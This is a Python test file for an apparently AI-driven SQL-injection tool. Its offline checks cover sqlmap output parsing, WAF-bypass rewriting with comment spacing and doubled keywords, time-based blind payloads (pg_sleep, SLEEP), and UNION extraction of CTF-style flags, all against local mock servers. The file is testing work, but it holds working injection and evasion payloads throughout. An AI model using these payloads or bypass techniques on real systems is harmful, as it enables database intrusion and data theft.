# -*- coding: utf-8 -*-
"""冒烟测试 6（证据链路修复）—— 覆盖 2026-10-15 深夜 50590 复测的三大缺陷修复。

全部为离线单元测试，无需起 demo_site / uvicorn。

覆盖：
  1) runner.parse_findings：解析判定行（Parameter/Type/Payload/DBMS/列数/technique usable）
  2) runner.summarize_for_ai：关键行优先 + 少量原始尾部（50590 回归：ORDER BY 行
     在旧 tail 261 位被切、SQLite 线索整条丢失 → 新摘要必须保住）
  3) runner.merge_findings：跨参数并集；not_injectable 一轮可注即整体可注
  4) ai._clip_verdict：结构化摘要保头、原始输出保尾
"""
import os
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

passed, failed = [], []


def check(name, cond, extra=""):
    (passed if cond else failed).append(name)
    print(f"{'✅' if cond else '❌'} {name} {extra}", flush=True)


# 50590 实测（job#2/job#3）输出的关键行片段——fixture 必须贴着真实形态写
_50590_OUTPUT = """[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[INFO] testing if the target URL content is stable
[INFO] heuristic test shows that GET parameter 'q' might be injectable
[INFO] 'ORDER BY' technique appears to be usable. 23 should be the number of columns
[INFO] target URL appears to have 6 columns in query
[INFO] testing 'SQLite AND boolean-based blind ...'
[INFO] testing 'Generic UNION query (...)'
[CRITICAL] unable to connect to the target URL
[WARNING] GET parameter 'q' does not seem to be injectable
---
back-end DBMS: SQLite
---
Parameter: q
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1' AND 8392=8392-- -
---
"""

# 旧链路缺陷复现材料：1500 字符的 tail，关键行在 261 位，其后全是长噪音段——
# 旧代码 [-1200:] 从 300 位起切，ORDER BY 行与 testing 行全丢
_NOISE = ("e. This should reduce the time needed for the union query "
          "injection attack. " * 60)          # ~3200 chars
_TAIL_261 = ("[INFO] 'ORDER BY' technique appears to be usable.\n"
             "[INFO] target URL appears to have 6 columns in query\n"
             "[INFO] testing 'SQLite AND boolean-based blind ...'\n" + _NOISE +
             "[CRITICAL] unable to connect to the target URL")


def unit_tests():
    from sqlmap_adapter import runner
    from app.services import ai

    # ---- 1) parse_findings ----
    f = runner.parse_findings(_50590_OUTPUT)
    check("解析可用技法 ORDER BY",
          "ORDER BY" in f["techniques_usable"], f"(实际 {f['techniques_usable']})")
    check("解析查询列数 6", f["columns"] == 6, f"(实际 {f['columns']})")
    check("解析 DBMS SQLite", (f["dbms"] or "").lower().startswith("sqlite"),
          f"(实际 {f['dbms']})")
    check("解析确认参数块（名/类型/Payload）",
          any(p.get("name") == "q" and "boolean" in (p.get("type") or "")
              and (p.get("payload") or "").startswith("q=")
              for p in f["parameters"]),
          f"(实际 {f['parameters']})")
    check("关键行含 unable to connect（喂给 AI 的存活信号）",
          any("unable to connect" in ln for ln in f["key_lines"]))
    check("例行 WAF 检测语句不进关键行",
          not any("checking if the target is protected" in ln for ln in f["key_lines"]))
    check("含 injectable 判定 → not_injectable 可识别",
          runner.parse_findings("all tested parameters do not appear to be injectable")
          ["not_injectable"] is True)

    # ---- 1b) 25793 复测现场：sqlmap 已识别注入点，但整个 job 超时被掐 ----
    # 原始日志（job#130）：参数块在「identified the following injection point」之后，
    # 旧分类层超时优先 → timeout，证据解析了却没消费，漏洞产出 0。
    _25793_TIMEOUT_OUTPUT = """[INFO] testing 'MySQL AND boolean-based blind - WHERE or HAVING clause'
sqlmap identified the following injection point(s) with a total of 152 HTTP(s) requests:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1%' AND 2625=2625 AND 'fEzc%'='fEzc&category=
---
"""
    f2 = runner.parse_findings(_25793_TIMEOUT_OUTPUT)
    check("25793 超时输出解析出已确认参数块",
          bool(f2["parameters"]) and f2["parameters"][0].get("name") == "q",
          f"(实际 {f2['parameters']})")
    check("超时前已识别注入点 → 升级 vuln_confirmed（不判 timeout）",
          runner._has_identified_injection(_25793_TIMEOUT_OUTPUT, f2) is True)
    _probe_only = "heuristic test shows that GET parameter 'q' might be injectable"
    check("仅试探行/无注入点块 → 不误判为确认",
          runner._has_identified_injection(_probe_only,
                                           runner.parse_findings(_probe_only)) is False)
    # job#137 现场：汇总块尚未生成，超时掐断在 false-positive 复核阶段
    _appears = ("[22:56:54] [INFO] GET parameter 'q' appears to be 'AND boolean-based "
                "blind - WHERE or HAVING clause' injectable (with --string=\"x\")")
    check("超时前单技法判定 appears to be injectable → 升级确认",
          runner._has_identified_injection(_appears, {}) is True)
    check("might not be injectable → 不升级确认",
          runner._has_identified_injection(
              "heuristic (basic) test shows that GET parameter 'q' might not be "
              "injectable", {}) is False)

    # ---- 1c) DBMS 指纹：超时前只有 heuristic 行（25793 PostgreSQL 现场）----
    check("heuristic 'could be' 行识别 DBMS",
          runner._extract_dbms("heuristic (extended) test shows that the back-end "
                               "DBMS could be 'PostgreSQL'") == "PostgreSQL")
    check("'it looks like ... is' 行识别 DBMS",
          runner._extract_dbms("it looks like the back-end DBMS is 'PostgreSQL'.")
          == "PostgreSQL")
    check("最终汇总行仍优先",
          runner._extract_dbms("back-end DBMS: PostgreSQL\n"
                               "heuristic (extended) test shows that the back-end "
                               "DBMS could be 'MySQL'") == "PostgreSQL")

    # ---- 1d) 深挖策略：PG 纯盲注 → 跳过 UNION/自测，直接定向枚举 ----
    from app.services import deep_exploit as de
    check("PG 无回显 → 走定向策略",
          de._pg_blind_only("PostgreSQL", "q=1%' AND 1=1-- -", None) is True)
    check("PG 带 UNION 回显 payload → 不跳过自测",
          de._pg_blind_only("PostgreSQL", "q=1 union select 1,2,3-- -", None) is False)
    check("非 PG 库 → 不走该策略", de._pg_blind_only("SQLite", "q=1'", None) is False)
    check("已有 flag → 不复测", de._pg_blind_only("PostgreSQL", "q=1'", "flag{x}") is False)
    import inspect
    check("run_sqlmap 支持 out_dir_key（同漏洞多步复用 session）",
          "out_dir_key" in inspect.signature(runner.run_sqlmap).parameters)

    # ---- 1e) 主动 DBMS 指纹 + AI 深挖直发 ----
    from app.services import dbms_probe, ai_deep
    check("时间判据：2s 探针 vs 基线 0.2s → 命中",
          dbms_probe.time_hit(0.2, 2.3, 2) is True)
    check("时间判据：0.6s 抖动 → 不命中",
          dbms_probe.time_hit(0.2, 0.8, 2) is False)
    check("无 AI 时有 PG 兜底模板（current_database）",
          any("current_database" in p["payload"]
              for p in ai_deep._builtin_for("PostgreSQL")))
    check("回显判据识别 PostgreSQL 版本串",
          ai_deep._ECHO_RE.search("PostgreSQL 14.5 on x86_64-pc-linux-gnu") is not None)
    check("回显判据识别 information_schema",
          ai_deep._ECHO_RE.search("tables | information_schema |") is not None)

    # ---- 1f) 轻量盲注提取 ----
    from app.services import blind_extract as be
    check("PG 时间盲注 payload 结构",
          "pg_sleep" in (be.build_payload("1", "1=1", "postgresql") or ""))
    check("MySQL 时间盲注 payload 结构",
          "SLEEP" in (be.build_payload("1", "1=1", "mysql") or ""))
    check("// 代空格变体",
          "//" in (be.build_payload("1", "1=1", "postgresql", slash=True) or ""))
    check("DBMS 归一（PG 带版本）",
          be.normalize_dbms("PostgreSQL 14.5") == "postgresql")
    check("字符条件生成",
          be._cond("current_database()", 1, ">", 100, "postgresql")
          == "ascii(substring((current_database()),1,1))>100")

    # ---- 1g) space2slash tamper 白名单 ----
    check("tamper 白名单含 space2slash", "space2slash" in runner._ALLOWED_TAMPERS)
    check("合法 tamper 透传",
          runner._sanitize_extra_args(["--tamper", "space2slash"])
          == ["--tamper", "space2slash"])
    check("非法 tamper 被丢弃",
          runner._sanitize_extra_args(["--tamper", "os-shell"]) == [])

    # ---- 1h) 49920 类 WAF：/**/ 代空格 + 关键字双写 ----
    from app.services import prober
    vs = ai.bypass_variants("1' union select 1,2")
    check("bypass_variants 含 /**/ + 双写 UNION 变体",
          any("/**/" in v and "uunionnion" in v.lower() for v in vs))
    check("强报错不再把「查询异常」当单向量确认",
          not any("查询异常" in k for k in prober._STRONG_ERROR_KEYWORDS))
    check("引号破坏型 parse error 一律弱证据",
          all(prober._is_parse_error(k) for k in
              ("unrecognized token", "you have an error in your sql syntax",
               "syntax error at or near", "查询异常")))
    check("parse error 不在强报错集合",
          not any(k in prober._STRONG_ERROR_KEYWORDS for k in
                  ("unrecognized token", "you have an error in your sql syntax",
                   "syntax error at or near")))
    check("DBMS 专属报错仍是强证据",
          prober._is_parse_error("warning: mysql") is False
          and "warning:\\s+mysql" in prober._STRONG_ERROR_KEYWORDS)
    check("弱报错 + 普通形态被静默过滤 → 升级为绕过揭示",
          prober._weak_error_is_revealed(
              "unrecognized token", "1' and 1=1", {"1' and 1=1"}))
    check("弱报错无对照组 → 不升级",
          not prober._weak_error_is_revealed(
              "unrecognized token", "1'", set()))
    check("强报错不依赖对照组",
          prober._weak_error_is_revealed("warning: mysql", "x", set()) is False)
    check("引号奇偶：单引号报错、双引号不报错 → 命中",
          prober._quote_parity_ok("unrecognized token", None, "normal page"))
    check("引号奇偶：两种都报错 → 不命中（49920 型）",
          not prober._quote_parity_ok("unrecognized token",
                                      "unrecognized token", "normal page"))
    check("引号奇偶：基线本来就有该报错 → 不命中",
          not prober._quote_parity_ok("unrecognized token", None,
                                      "查询异常: unrecognized token"))
    check("tamper 组合透传（space2comment,doublekeywords）",
          runner._sanitize_extra_args(["--tamper", "space2comment,doublekeywords"])
          == ["--tamper", "space2comment,doublekeywords"])
    check("tamper 白名单含 doublekeywords",
          "doublekeywords" in runner._ALLOWED_TAMPERS)
    sc = ai._apply_strategy("1' union select 1 from x", "space_comment")
    check("space_comment：/**/ 代空格 + 关键字双写",
          "/**/" in sc and "uunionnion" in sc.lower()
          and "sselectelect" in sc.lower() and "ffromrom" in sc.lower(),
          f"(实际 {sc})")
    sc2 = ai._apply_strategy("1' union select 1,(select 2 from x)", "space_comment")
    check("space_comment 只双写关键字的首次出现（WAF 只删一次）",
          sc2.lower().count("sselectelect") == 1,
          f"(实际 {sc2})")

    # ---- 1i) WAF 现场反推（报错 SQL → 变换 → 改写）----
    from app.services import waf_learn
    executed = ("SELECT id, name FROM products WHERE name LIKE '%1%'/**/UNION/**/SELECT/**/"
                "1,(SSELECTELECT/**/group_concat(name)),3,4--%'")
    sent = ("1%'/**/UUNIONNION/**/SSELECTELECT/**/1,(SELECT/**/group_concat(name)),3,4--")
    tf = waf_learn.infer_transforms(sent, executed)
    check("反推识别「关键字只删一次」", "kw_once" in tf, f"(实际 {tf})")
    tf2 = waf_learn.infer_transforms(
        "1' union select 1,2,3-- -",
        "SELECT id FROM products WHERE name LIKE '%1union select 1,2,3--%'")
    check("反推识别「空格被处理」", "space" in tf2, f"(实际 {tf2})")
    rw = waf_learn.rewrite("1' union select 1,(select 2 from x) -- -",
                           ["space", "kw_once"])
    check("反推改写：/**/ 代空格 + 只双写首次",
          "/**/" in rw and rw.lower().count("sselectelect") == 1, f"(实际 {rw})")
    ex = waf_learn.extract_executed_sql(
        '<div class="sql">SELECT id FROM products WHERE name LIKE \'%1%\'</div>')
    check("提取报错页中的实际 SQL", bool(ex) and ex.startswith("SELECT id"))
    check("有注入点块但无参数块 → 不误判为确认",
          runner._has_identified_injection(
              "sqlmap identified the following injection point(s):", {}) is False)

    # ---- 1j) WAF 通用 diff 引擎（49920 真页 + 删除全部/转义/编码/截断变体）----
    page_49920 = (
        '<html><body><div class="sql">SELECT id, name FROM products WHERE name LIKE '
        "'%1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/sqlite_master)>0--%'"
        "</div></body></html>"
    )
    sent_49920 = ("1'/**/AND/**/(SELSELECTECT/**/COUNT(*)/**/FRFROMOM/**/"
                  "sqlite_master)>0--")
    ex49920 = waf_learn.extract_executed_sql(page_49920)
    check("49920 报错页提取实际 SQL", bool(ex49920) and "LIKE" in ex49920)
    tf49920 = waf_learn.infer_transforms(sent_49920, ex49920)
    check("49920 真页：双写被吃掉一份 → kw_once（真页只剩单关键字）",
          "kw_once" in tf49920 and "kw_once:select" in tf49920
          and "kw_once:from" in tf49920, f"(实际 {tf49920})")
    plain = "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
    rw49920 = waf_learn.rewrite(plain, tf49920)
    check("49920 真页：改写为任意偏移双写",
          "sselectelect" in rw49920.lower() and "ffromrom" in rw49920.lower(),
          f"(实际 {rw49920})")
    # 删除全部出现：双写无效，必须走替代写法而不是傻双写
    tf_all = waf_learn.infer_transforms(
        "1' UNION SELECT 1 UNION SELECT 2--", "1'  1  2--")
    check("识别「删除全部出现」",
          "kw_all:union" in tf_all and "kw_all:select" in tf_all,
          f"(实际 {tf_all})")
    rw_all = waf_learn.rewrite("1' UNION SELECT 1 UNION SELECT 2--", tf_all)
    check("删除全部时不使用无效的双写",
          "uunionnion" not in rw_all.lower(), f"(实际 {rw_all})")
    # 删除一次（第二份保留）
    tf_once2 = waf_learn.infer_transforms(
        "1' UNION SELECT 1 UNION SELECT 2--", "1' SELECT 1 UNION SELECT 2--")
    check("识别「只删一次」而非全删",
          "kw_once:union" in tf_once2 and "kw_all" not in tf_once2,
          f"(实际 {tf_once2})")
    # 转义 / 编码 / 截断 / 大小写 / 空白替换
    check("识别反斜杠转义",
          "quote_backslash" in waf_learn.infer_transforms(
              "1' OR 1=1--", "1\\' OR 1=1--"))
    check("识别 URL 编码",
          "urlencode" in waf_learn.infer_transforms("1' OR 1=1--", "1%27 OR 1=1--"))
    check("识别截断",
          any(t.startswith("truncate:") for t in
              waf_learn.infer_transforms("1' UNION SELECT 1,2,3--", "1' UNION")))
    check("识别大小写归一",
          "case" in waf_learn.infer_transforms("SELECT 1", "select 1"))
    check("识别空白替换为注释",
          "space_comment" in waf_learn.infer_transforms(
              "1' union select 1", "1'/**/union/**/select/**/1"))
    # 离线页 → 推断 → 改写 → 断言（端到端，不依赖外网）
    page_plain = ('<div class="sql">SELECT id FROM products WHERE name LIKE '
                  "'%1' AND ( COUNT(*)  sqlite_master)>0--%'</div>")
    new_payload, tf_e2e = waf_learn.infer_and_rewrite(
        "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--", page_plain)
    check("离线报错页端到端：提取→推断→改写",
          bool(new_payload) and "sselectelect" in new_payload.lower()
          and "ffromrom" in new_payload.lower(),
          f"(实际 {new_payload}, {tf_e2e})")

    # ---- 2) summarize_for_ai（50590 回归）----
    s = runner.summarize_for_ai(f, _TAIL_261)
    check("摘要保留 ORDER BY 可用技法（旧链路在 tail 261 位被切）",
          "ORDER BY" in s)
    check("摘要保留列数 6", "6" in s)
    check("摘要保留 SQLite 技法测试线索", "SQLite AND boolean-based blind" in s)
    check("摘要保留 CRITICAL 存活信号", "unable to connect" in s)
    check("摘要带结构化标记头", s.startswith("【SQLMap 结构化判定】"))
    check("摘要附少量原始尾部", "【原始输出尾部（截尾）】" in s
          and len(s) < 2500)
    # 超时场景：不管 status，findings 从既有输出解析（超时丢证据 = P0）
    f_timeout = runner.parse_findings(_TAIL_261)
    check("超时场景下已产出的判定不丢",
          "ORDER BY" in f_timeout["techniques_usable"] and f_timeout["columns"] == 6)

    # ---- 3) merge_findings ----
    a = {"dbms": None, "columns": None, "techniques_usable": ["ORDER BY"],
         "parameters": [], "key_lines": ["[CRITICAL] x"], "not_injectable": False}
    b = {"dbms": "SQLite", "columns": 6, "techniques_usable": ["ORDER BY", "UNION"],
         "parameters": [{"name": "q"}], "key_lines": ["[CRITICAL] x", "[WARNING] y"],
         "not_injectable": True}
    m = runner.merge_findings(a, b)
    check("合并去重并集", m["techniques_usable"] == ["ORDER BY", "UNION"]
          and m["columns"] == 6 and m["dbms"] == "SQLite")
    check("合并 key_lines 去重", m["key_lines"] == ["[CRITICAL] x", "[WARNING] y"])
    check("一轮可注即整体可注", m["not_injectable"] is False)
    check("空基线返回拷贝", runner.merge_findings({}, b) == b)

    # ---- 4) ai._clip_verdict ----
    short = "【SQLMap 结构化判定】\n后端DBMS: SQLite"
    check("短摘要原样通过", ai._clip_verdict(short) == short)
    long_struct = "【SQLMap 结构化判定】\n" + ("x" * 3000)
    clipped = ai._clip_verdict(long_struct, 1400)
    check("长结构化摘要保头", clipped.startswith("【SQLMap 结构化判定】") and len(clipped) == 1400)
    long_raw = "y" * 3000
    check("长原始输出保尾", ai._clip_verdict(long_raw, 1400) == "y" * 1400)
    check("空输入返回 None", ai._clip_verdict(None) is None and ai._clip_verdict("") is None)


# ============ 研判探针 bypass 成对档（内置微型靶场，离线） ============

import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace
from urllib.parse import urlparse, parse_qsl


class _FilterHandler(BaseHTTPRequestHandler):
    """过滤型微型靶场。mode 决定形态：
      error ：含空格或含裸引号（无 //）→ 整条吃掉；// 形态放行且必然触发 SQL 报错
              → 验证 bypass_reveal（普通形态被吃、绕过形态揭示）
      bool  ：等值模板 name = '{q}'；同上吃普通形态；// 形态放行
              → 验证 bypass_diff（true 有行、false 无行的布尔差异）
      benign：不过滤，页面带 CSS `.select{...}`（旧 snippet 正则会误匹配）
    """
    mode = "error"

    def log_message(self, *a):
        pass

    def _send(self, code, obj):
        data = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        qs = dict(parse_qsl(urlparse(self.path).query, keep_blank_values=True))
        q = qs.get("q", "1")
        if self.mode == "benign":
            css = "<style>.select{color:red}</style><p>normal page</p>"
            data = (f"<html><head>{css}</head><body>results for {q}</body></html>")
            body = data.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        # 过滤：裸空格或"含引号但无 //"→ 整条静默吃掉（q 退回基线 1）
        if " " in q or ("'" in q and "//" not in q):
            self._send(200, {"sql": "SELECT id,name FROM products WHERE name = '1'",
                             "results": [["1", "Product 1"]], "swallowed": True})
            return
        qq = q.replace("//", " ")
        if self.mode == "error":
            self._send(200, {"sql": f"SELECT ... '{qq}'", "results": [],
                             "error": "查询异常: unrecognized token: \"'\""})
            return
        # bool：等值模板。'1'='1' 真 → 有行；'1'='2' 假 → 无行
        cond_true = "'1'='1" in qq
        self._send(200, {"sql": f"SELECT id,name FROM products WHERE name = '{qq}'",
                         "results": ([["1", "Product 1"]] * 40) if cond_true else []})


def _probe_server_tests():
    from app.services import ai as ai_svc

    def start(mode):
        _FilterHandler.mode = mode
        srv = ThreadingHTTPServer(("127.0.0.1", 0), _FilterHandler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv, srv.server_address[1]

    def make_ep(port):
        return SimpleNamespace(
            params=[{"name": "q", "sample_value": "1", "location": "query"}],
            raw_path="/api/x", path="/api/x", host=f"127.0.0.1:{port}",
            method="GET", task_id=0)

    # --- 过滤型·报错形态：bypass_reveal ---
    srv, port = start("error")
    try:
        probes = ai_svc._collect_sqli_probes(make_ep(port))
        labels = [p["label"] for p in probes]
        check("过滤型靶场：探针含 bypass 成对档",
              "bypass_true" in labels and "bypass_false" in labels, f"(实际 {labels})")
        check("普通引号形态被静默吃掉（靶场行为校准）",
              not any(p.get("label") == "quote" and p.get("sql_error_like") for p in probes))
        check("bypass 变体触发 SQL 报错",
              any(p.get("label") == "bypass_true" and p.get("sql_error_like") for p in probes))
        check("衍生证据 bypass_reveal（绕过揭示）",
              any(p.get("label") == "bypass_reveal" and p.get("matched") == "bypass_error"
                  for p in probes), f"(实际 {[p.get('label') for p in probes]})")
        check("bypass_reveal 带 sql_error_like → 研判保底抬分生效",
              any(p.get("label") == "bypass_reveal" and p.get("sql_error_like") for p in probes))
    finally:
        srv.shutdown()
        srv.server_close()

    # --- 过滤型·布尔形态：bypass_diff ---
    srv, port = start("bool")
    try:
        probes = ai_svc._collect_sqli_probes(make_ep(port))
        check("衍生证据 bypass_diff（过滤型布尔差异）",
              any(p.get("label") == "bypass_diff" and p.get("matched") == "bypass_bool_diff"
                  for p in probes),
              f"(实际 {[(p.get('label'), p.get('matched')) for p in probes]})")
    finally:
        srv.shutdown()
        srv.server_close()

    # --- 良性靶场：不产衍生证据（防误报）+ CSS 不再污染 snippet ---
    srv, port = start("benign")
    try:
        probes = ai_svc._collect_sqli_probes(make_ep(port))
        check("良性靶场：无 bypass 衍生证据（防误报）",
              not any(p.get("matched") in ("bypass_error", "bypass_bool_diff")
                      for p in probes),
              f"(实际 {[(p.get('label'), p.get('matched')) for p in probes]})")
        check("snippet 不被页面 CSS .select{...} 污染",
              not any("select{" in (p.get("snippet") or "").lower() for p in probes),
              f"(实际 {[p.get('snippet') for p in probes][:3]})")
    finally:
        srv.shutdown()
        srv.server_close()


def _payload_hint_tests():
    from app.services.deep_exploit import _extract_payload_hint

    def fake_ev(etype, content="", meta=None):
        return SimpleNamespace(evidence_type=etype, content=content, meta=meta)

    # 新证据（带结构化 meta）：payload 原文照抄，含 = 也不截断
    rows = [fake_ev("waf_info", "has_waf=False"),
            fake_ev("payload", "[boolean] 1' and '1'='1\n预期判据: x",
                    meta={"vector": "boolean", "payload": "1' and '1'='1", "criteria": "x"})]
    got = _extract_payload_hint(rows)
    check("meta 优先：payload 含 = 不再被砍",
          got == "1' and '1'='1", f"(实际 {got!r})")
    check("meta 优先：绕过形态 payload 原样保留",
          _extract_payload_hint([fake_ev(
              "payload", "[error] 1'//and//'1'='1",
              meta={"payload": "1'//and//'1'='1"})]) == "1'//and//'1'='1")
    # 47887 实测坏例：含 = 的 payload 旧解析砍成 '1；meta 修复后必须全须全尾
    bad = _extract_payload_hint([fake_ev(
        "payload", "[boolean] 1' and '1'='1\n预期判据: x", meta=None)])
    check("旧证据兜底路径仍可解析（含已知缺陷，仅兜底用）",
          bad == "'1", f"(实际 {bad!r})")
    check("sqlmap 风格 q=payload 兜底解析保留",
          _extract_payload_hint([fake_ev("payload", "[union] q=1' UNION SELECT 1,2-- ")])
          == "1' UNION SELECT 1,2--")
    check("无 payload 证据返回 None",
          _extract_payload_hint([fake_ev("console_log", "...")]) is None)
    check("空列表返回 None", _extract_payload_hint([]) is None)

    # 2026-10-23 hbc2:23201：带 /**/ 的布尔命中是抖动假阳性、闭合符还是错的单引号，
    # 抢走了真正有效的双引号受控时间对 → 深挖用错语境全盘卡死。受控命中必须优先。
    rows = [fake_ev("payload", "[boolean] 1'/**/and/**/'1'='1",
                    meta={"vector": "boolean", "payload": "1'/**/and/**/'1'='1",
                          "controlled": False}),
            fake_ev("payload", '[time] 1" and if(1=1,sleep(3),1)-- -',
                    meta={"vector": "time", "controlled": True,
                          "payload": '1" and if(1=1,sleep(3),1)-- -'})]
    check("受控时间对优先于 /**/ 普通命中",
          _extract_payload_hint(rows) == '1" and if(1=1,sleep(3),1)-- -',
          f"(实际 {_extract_payload_hint(rows)!r})")
    # UNION 回显仍是更快的深挖路径：仍排第一
    rows.append(fake_ev("payload", "[union] 1' UNION SELECT 1,2-- ",
                        meta={"vector": "union", "payload": "1' UNION SELECT 1,2-- ",
                              "controlled": False}))
    check("UNION 回显仍优先于受控时间对",
          _extract_payload_hint(rows) == "1' UNION SELECT 1,2-- ")


def _char_union_tests():
    from app.services.char_union_exploit import CharUnionExploiter

    ex = CharUnionExploiter.__new__(CharUnionExploiter)   # 不发请求，只测纯函数

    # 列名优先级：flag/secret/content 关键词列排前（DDL 声明顺序的 id 不再抢先）
    order = ex._pick_column_order(["id", "content", "user_id"])
    check("取数列优先级：content 排在 id 前",
          order == ["content", "id", "user_id"], f"(实际 {order})")

    # 回显型 JSON 靶点的 token 提取
    base_body = ('{"sql": "SELECT id,name,price,stock FROM products '
                 'WHERE name LIKE \'%1%\'", "results": [], "swallowed": false}')
    # 旧 bug 场景：取数响应只含 SQL 回显、无数据 → 不该把 group_concat 当样本
    echo_body = ('{"sql": "SELECT ... LIKE \'%1\' UNION SELECT '
                 '1,group_concat(content),3,4 from secrets-- %\'", "results": [], '
                 '"swallowed": false}')
    check("回显里的 group_concat 不再被当数据",
          ex._extract_new_token(base_body, echo_body) != "group_concat",
          f"(实际 {ex._extract_new_token(base_body, echo_body)!r})")
    # 取数候选校验：提取物若出现在发出的 SQL 文本里（回显噪声）→ 不算数据
    # （旧 bug：无数据时把回显里的列名 content 当样本返回）
    sent_sql = "1' UNION SELECT 1,group_concat(content),3,4 from secrets-- "
    v = ex._extract_new_token(base_body, echo_body)
    check("取数候选校验：回显里的列名 content 不算数据",
          (v or "").lower() in sent_sql.lower(),
          f"(实际 {v!r} —— 命中 _is_data 校验会被拒)")
    # 数据真的回来了：flag 在 results 里 → 必须取到
    data_body = ('{"sql": "SELECT ... LIKE \'%1\' UNION SELECT '
                 '1,group_concat(content),3,4 from secrets-- %\'", '
                 '"results": [["1", "flag{local_waf_bypass_ok}", "3", "4"]], '
                 '"swallowed": false}')
    check("flag 数据在 results 里 → 提取到 flag",
          ex._extract_new_token(base_body, data_body) == "flag{local_waf_bypass_ok}",
          f"(实际 {ex._extract_new_token(base_body, data_body)!r})")
    # 表名提取不受影响（group_concat(name) 的多值列表）
    tables_body = ('{"sql": "...LIKE \'%1\' UNION SELECT 1,group_concat(name),3,4 '
                   'from sqlite_master-- %\'", "results": '
                   '[["1", "products,secrets", "3", "4"]], "swallowed": false}')
    check("sqlite_master 表名列表提取不受影响",
          ex._extract_new_token(base_body, tables_body) == "products,secrets",
          f"(实际 {ex._extract_new_token(base_body, tables_body)!r})")


def _bool_pair_tests():
    from app.services import prober

    # ---- 47887 回归：不等式盲注对的时间信号（双向）----
    # 实测：>'0'(真,76ms) vs <'0'(假,3084ms) —— 假值慢 40 倍，旧判据只认"真值慢"整条漏掉
    hit, crit = prober._bool_time_hit(0.076, 3.084)
    check("不等式对·假值慢 40 倍 → 命中（47887 回归）", hit, f"({crit})")
    check("判据文案标注慢的一侧", "假值" in crit and "3.08s" in crit, f"({crit})")
    hit, crit = prober._bool_time_hit(3.084, 0.076)
    check("不等式对·真值慢（16328 形态）→ 命中", hit, f"({crit})")
    check("耗时接近 → 不命中", prober._bool_time_hit(0.2, 0.3)[0] is False)
    check("差 1s 但倍率不足 → 不命中", prober._bool_time_hit(2.0, 1.1)[0] is False)
    check("双慢（都 >2s 但接近）→ 不命中", prober._bool_time_hit(2.5, 2.2)[0] is False)

    # ---- false_variant 兜底：等式对 + 不等式翻方向 ----
    check("等式对 1=1 → 1=2",
          prober._false_variant("1' and 1=1-- ") == "1' and 1=2-- ")
    check("引号等式对 → '2'",
          prober._false_variant("1' and '1'='1' -- ") == "1' and '1'='2' -- ")
    check("不等式对 > 翻 <（47887 形态）",
          prober._false_variant("1' and sqlite_version()>'0'-- ")
          == "1' and sqlite_version()<'0'-- ")
    check("不等式对 < 翻 >",
          prober._false_variant("x<'0'") == "x>'0'")
    check("无比价形态返回原文（probe 端将跳过等生成端配对）",
          prober._false_variant("1' or sleep(3)") == "1' or sleep(3)")

    # 受控布尔对 = 强证据（2026-10-24：纯布尔靶不再依赖 sqlmap）
    import inspect as _inspect
    check("受控布尔对可单向量确认",
          prober._has_strong_evidence([{"vector": "boolean", "controlled": True}]) is True)
    check("普通布尔命中仍需第二向量",
          prober._has_strong_evidence([{"vector": "boolean", "criteria": "差异"}]) is False)
    check("判据A（true=基线）标记 controlled",
          '"controlled": True' in _inspect.getsource(prober.probe_endpoint))


def _time_pair_tests():
    """2026-10-23 hbc2:13666 纯时间盲注靶漏检的回归。

    靶点：GET /check?id=1，响应恒为同一 JSON（58B），双引号闭合，
    `1" and if(1=1,sleep(3),1)#` 真值休眠。AI 只给了 boolean 向量 →
    单一向量按设计 inconclusive。修法：确定性追加时间成对探针 + 受控对照判据。
    """
    from types import SimpleNamespace
    from app.services import ai as ai_svc
    from app.services import prober

    # ---- ① 模板成对同构：除 1=1/1=2 外逐字符一致 ----
    for true_tpl, false_tpl in ai_svc._TIME_PAIR_TEMPLATES:
        tp = true_tpl.format(v="1", t=3)
        fp = false_tpl.format(v="1", t=3)
        check(f"时间对同构且真值休眠: {tp[:24]}",
              tp.replace("1=1", "1=2") == fp and "sleep(3)" in tp)

    # ---- ② AI 只给 boolean 向量时，仍必须追加时间对（本次漏检根因）----
    class _FakeClient:
        def chat_json(self, system, user):
            return {"payloads": [{"payload": "1'/**/and/**/'1'='1", "vector": "boolean",
                                  "false_variant": "1'/**/and/**/'1'='2",
                                  "expected_criteria": "x"}]}

    orig_client = ai_svc.get_ai_client
    kb_mod = ai_svc.knowledge
    orig_find = kb_mod.find_payloads
    ai_svc.get_ai_client = lambda db: _FakeClient()
    kb_mod.find_payloads = lambda *a, **k: []
    try:
        ep = SimpleNamespace(
            method="GET", path="/check", read_write="read",
            params=[{"name": "id", "location": "query", "sample_value": "1"}])
        # 显式给探针证据：避免生成函数回落到真发探针请求
        ctx = {"probes": [{"param": "id", "label": "baseline", "status": 200,
                           "length": 58, "sql_error_like": False, "snippet": ""}]}
        payloads = ai_svc.generate_payloads(None, ep, None, strategies=[],
                                            base_value="1", probe_context=ctx)
    finally:
        ai_svc.get_ai_client = orig_client
        kb_mod.find_payloads = orig_find

    times = [p for p in payloads if p.get("vector") == "time"]
    check("AI 只给 boolean 时仍追加时间对", len(times) == len(ai_svc._TIME_PAIR_TEMPLATES),
          f"(实际 {len(times)})")
    check("时间对带同构 false_variant（受控对照）",
          all(p.get("false_variant") for p in times))
    check("时间对覆盖双引号闭合（hbc2:13666 语境）",
          any(p["payload"].startswith('1" and if') for p in times),
          f"(实际 {[p['payload'][:18] for p in times]})")
    check("时间对使用参数样例值（非硬编码 1）",
          all(p["payload"].startswith("1") for p in times))

